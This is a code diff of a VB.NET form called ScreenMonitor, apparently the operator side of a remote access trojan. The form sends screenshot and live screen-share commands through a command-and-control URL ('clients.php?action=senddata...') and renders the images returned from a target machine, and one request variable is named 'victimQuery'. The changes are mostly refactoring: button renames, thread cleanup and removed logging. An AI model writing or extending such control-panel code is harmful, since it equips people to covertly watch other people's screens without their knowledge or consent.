@@ -1,4 +1,6 @@
-﻿Imports System.IO
+﻿Imports System.ComponentModel
+Imports System.Drawing.Imaging
+Imports System.IO
 Imports System.IO.Compression
 Imports System.Net
 Imports System.Text
@@ -6,13 +8,18 @@ Imports System.Threading
 
 Public Class ScreenMonitor
     Public targetIp As String = ""
-    Private transmissionThread As Threading.Thread = Nothing
+    Private transmissionThread As Thread = Nothing
     Private startMonitorSpamWC, fluxManagementWC As New WebClient()
     Private connectionEstablished As Boolean = False
+
     Public xPosRemote As String = ""
     Public yPosRemote As String = ""
+
     Private Sub ScreenMonitor_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Text = "Screen Monitor  @ " & targetIp
+    End Sub
+    Private Sub ScreenMonitor_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
+        If transmissionThread IsNot Nothing Then transmissionThread.Abort()
     End Sub
 
     Private Function stringQualityToLong(quality As String) As Long
@@ -28,12 +35,12 @@ Public Class ScreenMonitor
     End Function
 
     Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
-        transmissionThread = New Threading.Thread(Sub() doTransmission(500 / Convert.ToInt32(FPS.SelectedItem)))
+        transmissionThread = New Thread(Sub() doTransmission(500 / Convert.ToInt32(FPS.SelectedItem)))
         transmissionThread.Start()
         StartButton.Text = "Loading..."
         StartButton.Enabled = False
         StopButton.Enabled = True
-        Button3.Enabled = False
+        screenshotBTN.Enabled = False
     End Sub
     Private Sub StopButton_Click(sender As Object, e As EventArgs) Handles StopButton.Click
         Dim client = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshare&actioncontent=stop")
@@ -41,7 +48,7 @@ Public Class ScreenMonitor
         Render.Image = Nothing
         StopButton.Enabled = False
         StartButton.Enabled = True
-        Button3.Enabled = True
+        screenshotBTN.Enabled = True
     End Sub
     Function DeflateDecompress(ByVal toDecompress As Byte()) As Byte()
         Try
@@ -73,12 +80,12 @@ Public Class ScreenMonitor
                 Exit Try
             End If
 
-            Console.WriteLine("received " & rawReceivedBytes.Length & " bytes")
             Render.Image = New Bitmap(New MemoryStream(DeflateDecompress(rawReceivedBytes)))
             Render.Refresh()
 
-            Dim msTimeout As Integer = interval - Date.Now.Subtract(startTime).TotalMilliseconds
-            Console.WriteLine("slept " & msTimeout)
+            Dim msTimeout As Integer =
+                interval - Date.Now.Subtract(startTime).TotalMilliseconds
+
             If msTimeout < 1 Then
                 GC.Collect()
                 Exit Try
@@ -102,9 +109,7 @@ Public Class ScreenMonitor
         End If
     End Sub
 
-
-
-    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
+    Private Sub screenshotBTN_Click(sender As Object, e As EventArgs) Handles screenshotBTN.Click
         Dim s As String = "abcdefghijklmnopqrstvuwxyz"
         Dim r As New Random : Dim sb As New StringBuilder
         For i As Integer = 1 To 8
@@ -113,7 +118,8 @@ Public Class ScreenMonitor
         Next
 
         Dim victimQuery = New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=senddata&target=" & targetIp & "&actiontype=screenshot&actioncontent=" & sb.ToString())
-        Threading.Thread.Sleep(2000)
+        Thread.Sleep(2000)
+
 displayimage:
         Try
             Threading.Thread.Sleep(100)
@@ -149,8 +155,6 @@ displayimage:
     End Sub
 
 #End Region
-
-
 
 
 
